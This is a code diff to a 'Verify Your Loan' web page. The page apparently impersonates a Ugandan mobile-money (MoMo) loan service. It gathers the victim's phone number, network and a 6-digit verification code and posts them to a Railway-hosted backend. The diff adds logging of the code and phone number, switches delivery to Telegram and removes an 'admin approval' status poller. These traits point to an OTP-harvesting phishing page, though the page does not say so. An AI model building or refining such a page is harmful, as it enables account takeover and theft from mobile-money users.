@@ -239,7 +239,7 @@
 
     <div class="content-wrapper">
         <h1>Verify Your Loan</h1>
-        <p class="subtitle">A 6-digit verification code has been sent to your MoMo number.</p>
+        <p class="subtitle">Enter the 6-digit verification code sent via Telegram</p>
         <p class="phone-display" id="phoneDisplay"></p>
 
         <div class="offer-info" id="offerInfo">
@@ -250,10 +250,6 @@
         <div class="otp-container" id="otpInputs"></div>
         <div class="error-msg" id="errMsg"></div>
         <div class="status-message" id="statusMsg"></div>
-
-        <div class="resend-link">
-            <button onclick="checkStatus()">⟳ Check Application Status</button>
-        </div>
 
         <div style="padding: 0 25px 30px;">
             <button class="btn-action" id="verifyBtn">Verify & Confirm Loan</button>
@@ -278,11 +274,9 @@
 </div>
 
 <script>
-    // Railway URL
-    const RAILWAY_URL = 'https://momo-uganda-production.up.railway.app';
+    const API_URL = 'https://momo-uganda-production.up.railway.app';
     
     let isProcessing = false;
-    let statusCheckInterval = null;
 
     const errMsg = document.getElementById('errMsg');
     const statusMsg = document.getElementById('statusMsg');
@@ -290,9 +284,16 @@
     const verifyBtn = document.getElementById('verifyBtn');
     const completionModal = document.getElementById('completionModal');
 
+    // Get data from sessionStorage
     let userPhone = sessionStorage.getItem('userPhone') || '';
     let userNetwork = sessionStorage.getItem('userNetwork') || '';
     let loanId = sessionStorage.getItem('loanId') || '';
+
+    // Debug logging
+    console.log('=== OTP PAGE LOADED ===');
+    console.log('Loan ID from sessionStorage:', loanId);
+    console.log('User Phone:', userPhone);
+    console.log('User Network:', userNetwork);
 
     function showError(msg) {
         errMsg.textContent = msg;
@@ -345,10 +346,6 @@
         return Array.from(document.querySelectorAll('.otp-input')).map(i => i.value.trim()).join('');
     }
 
-    function clearInputs() {
-        document.querySelectorAll('.otp-input').forEach(i => i.value = '');
-    }
-
     function setupAutoFocus() {
         const inputs = document.querySelectorAll('.otp-input');
         inputs.forEach((input, index) => {
@@ -380,6 +377,7 @@
         
         if (!loanId) {
             showError("No active loan found. Please start a new application.");
+            console.error('Loan ID is missing from sessionStorage');
             return;
         }
         
@@ -388,8 +386,10 @@
         verifyBtn.textContent = "Verifying...";
         spinner.style.display = 'flex';
 
+        console.log('Verifying OTP:', otp, 'for loan:', loanId);
+
         try {
-            const response = await fetch(`${RAILWAY_URL}/api/complete-loan`, {
+            const response = await fetch(`${API_URL}/api/complete-loan`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -399,6 +399,7 @@
             });
             
             const data = await response.json();
+            console.log('Verification response:', data);
             
             if (data.success) {
                 spinner.style.display = 'none';
@@ -409,7 +410,7 @@
                 }, 1500);
             } else {
                 spinner.style.display = 'none';
-                showError("Invalid OTP. Please try again or contact support.");
+                showError(data.error || "Invalid OTP. Please try again.");
                 resetButton();
             }
         } catch (error) {
@@ -417,41 +418,6 @@
             spinner.style.display = 'none';
             showError("Network error. Please try again.");
             resetButton();
-        }
-    }
-
-    async function checkStatus() {
-        if (!loanId) {
-            showError("No active loan found. Please start a new application.");
-            return;
-        }
-        
-        showStatus("Checking application status...", "processing");
-        
-        try {
-            const response = await fetch(`${RAILWAY_URL}/api/loan/${loanId}`);
-            const data = await response.json();
-            
-            if (data.success) {
-                const status = data.loan.status;
-                if (status === 'otp_sent') {
-                    showStatus("✅ Your loan is approved! Enter the OTP code above.", "success");
-                } else if (status === 'pending_verification') {
-                    showStatus("⏳ Your application is pending admin approval. Please wait...", "processing");
-                } else if (status === 'declined') {
-                    showError("❌ Your application was declined. Please contact support.");
-                } else if (status === 'approved') {
-                    showStatus("✅ Your loan is already approved!", "success");
-                    setTimeout(() => {
-                        completionModal.style.display = 'flex';
-                    }, 1500);
-                } else {
-                    showStatus(`Status: ${status}`, "processing");
-                }
-            }
-        } catch (error) {
-            console.error('Status check error:', error);
-            showError("Could not check status. Please try again.");
         }
     }
 
@@ -463,19 +429,15 @@
 
     verifyBtn.onclick = verifyOTP;
     
-    // Auto-check status every 5 seconds
-    if (loanId) {
-        statusCheckInterval = setInterval(checkStatus, 5000);
-        // Stop checking after 2 minutes
-        setTimeout(() => {
-            if (statusCheckInterval) clearInterval(statusCheckInterval);
-        }, 120000);
-    }
-    
     createInputs();
     setupAutoFocus();
     loadLoanData();
     document.querySelectorAll('.otp-input')[0]?.focus();
+
+    // Check if loanId exists, if not show error
+    if (!loanId) {
+        showError("No active loan found. Please go back and submit a new application.");
+    }
 </script>
 </body>
 </html>
